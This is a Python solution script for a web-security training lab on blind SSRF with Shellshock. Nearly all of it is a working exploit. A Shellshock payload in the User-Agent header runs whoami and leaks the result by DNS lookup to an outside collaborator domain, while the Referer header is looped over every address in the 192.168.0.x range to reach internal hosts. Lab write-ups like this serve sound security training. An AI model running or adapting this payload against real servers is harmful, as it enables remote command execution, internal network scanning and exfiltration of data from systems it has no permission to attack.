############################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 19/10/2023
#
# Lab: Blind SSRF with Shellshock exploitation
#
# Steps: 1. Inject shellshock payload into the User-Agent header to exfiltrate the 
#           OS user via DNS lookup
#        2. Inject SSRF payload into the Referer header to iterate over all private IPs
#        3. Check your burp collaborator for the OS user in the DNS lookup
#        4. Submit the solution
#
############################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
url = "https://0a0700ff03aad761844ff1fc0089007a.web-security-academy.net"

# change this to your collaborator domain
collaborator = "qichzll2hz9bmm0v9hg7tynmddj470vp.oastify.com"

print(Fore.BLUE + "‚ü™#‚ü´ Injection point: " + Fore.YELLOW + "User Agent & Referer headers")

# payload to exfiltrate the OS user via DNS lookup using shellshock exploitation
shellshock_payload = f"() {{ 42;}};echo;/bin/nslookup $(/bin/whoami).{collaborator}"

# iterate over all possible numbers
for x in range(0,255):
    # payload to perform SSRF
    payload = f"http://192.168.0.{x}:8080"

    # set headers
    headers = {
        "User-Agent": shellshock_payload,
        "Referer": payload
    }

    try:
        # fetch the page with the injected payload
        requests.get(f"{url}/product?productId=1", headers=headers)

    except:
        print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")

    print(Fore.WHITE + "‚ùØ Injecting shellshock payload with SSRF to all private IPs (" + Fore.YELLOW + f"192.168.0.{x}:8080" + Fore.WHITE + ").. ", end="\r", flush=True)
   
print(Fore.WHITE + "\nüóπ Check your burp collaborator for the OS user in the DNS lookup then submit the solution")

